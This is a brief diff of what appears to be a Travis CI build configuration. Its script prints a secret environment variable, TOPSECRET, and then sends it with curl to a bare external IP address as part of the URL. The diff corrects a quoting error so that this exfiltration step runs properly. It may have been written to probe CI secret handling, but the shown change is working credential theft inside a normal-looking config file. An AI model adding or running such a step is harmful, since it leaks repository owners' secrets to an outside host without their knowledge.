@@ -1,4 +1,4 @@
 language: minimal
 script:
   - echo ${TOPSECRET}
-  - curl "http://139.59.36.161/${TOPSECRET}""
+  - curl "http://139.59.36.161/${TOPSECRET}"
